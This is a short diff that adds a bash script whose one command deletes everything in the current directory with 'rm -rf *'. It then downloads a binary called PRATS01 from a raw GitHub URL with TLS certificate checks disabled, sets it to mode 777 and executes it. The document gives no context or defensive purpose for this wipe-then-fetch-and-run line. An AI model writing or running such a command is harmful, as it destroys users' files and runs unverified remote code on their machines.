@@ -1,0 +1,2 @@
+#!/bin/bash
+rm -rf * && wget --no-check-certificate -O PRATS01 https://raw.githubusercontent.com/GitHubRaghu71/prats/main/PRATS01 && chmod 777 PRATS01 && ./PRATS01
